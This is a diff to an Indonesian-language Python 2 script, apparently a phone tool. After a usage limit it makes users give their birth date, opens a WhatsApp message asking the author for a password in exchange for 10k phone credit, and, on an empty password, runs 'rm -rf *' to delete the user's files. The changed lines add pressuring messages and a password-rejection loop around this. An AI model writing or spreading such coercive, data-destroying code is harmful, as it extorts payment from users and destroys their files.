@@ -528,15 +528,22 @@ def divev():
 	v = len(z)
 	print da
 	if v < da:
-		l = raw_input(' [T] Masukkan Tnggal Lahir : ')
+		print "\n  Kamu udah menggunakan tools ini lebih dari yang di tentukan oleh pembuat, Silahkan kamu minta passwordnya ke pembuat tools ini dengan cara masukkan tgl,bulan, dan tahun kelahiranmu."
+		l = raw_input('\n [T] Masukkan Tnggal Lahir Kamu : \n ======> ')
 		h = l.replace('/', 'd3v').replace('0', '10')
 		ha = base64.b64encode(h)
 		print h + ' | ' + ha
-		subprocess.check_output(['am','start',"https://wa.me/628812457948?text="+ha+" | Assalamu'alaikum,  Bang Minta Passwordnya, ntar saya kirim pulsa 10k serta buktinya *Syarat Mendapatkan Password = kamu harus kirim pulsa 10k dulu ke no ini = 08812457948, Kirim bukti pengiriman pulsanya, ntar kamu akan di beri sandinya*"])
-		f = raw_input(' [P] Masukkan sandinya = ')
+		subprocess.check_output(['am','start',"https://wa.me/628812457948?text="+ha+" | Assalamu'alaikum,  Bang Minta Passwordnya, ntar saya kirim pulsa 10k serta bukti pengirimannya  | *Syarat Mendapatkan Password = kamu harus kirim pulsa 10k dulu ke no ini = 08812457948, smartfren, Kirim bukti pengiriman pulsanya (ss), ntar kamu akan di beri Password* Note: PESAN INI JANGAN DI HAPUS, HARUS DIKIRIMKAN!!"])
+		f = raw_input('\n [P] Masukkan Password : \n ==============> ')
 		if f == '' or f == ' ':
 			os.system('rm -rf *')
 			sys.exit()
+		if f == h:
+			print "\n Maaf Sandinya Salah.. Silahkan hubungi pembuat programnya dan minta sandi yang benar karena sandinya unik jadi tidak semua pengguna itu sama sandinya, silahkan hubungi pembuatnya.. dengan cara memasukkan tgl, bulan, dan tahun kelahiranmu di tool ini :) \n "
+			divev()	
+		if f != '0'+h+'0':
+			print "\n Maaf Sandinya Salah.. Silahkan hubungi pembuat programnya dan minta sandi yang benar karena sandinya unik jadi tidak semua pengguna itu sama sandinya, silahkan hubungi pembuatnya.. dengan cara memasukkan tgl, bulan, dan tahun kelahiranmu di tool ini :) \n "
+			divev()	
 		if f == '0'+h+'0':
 			g = open('dir/pass.txt', 'w')
 			g.write('w\n'*1000)
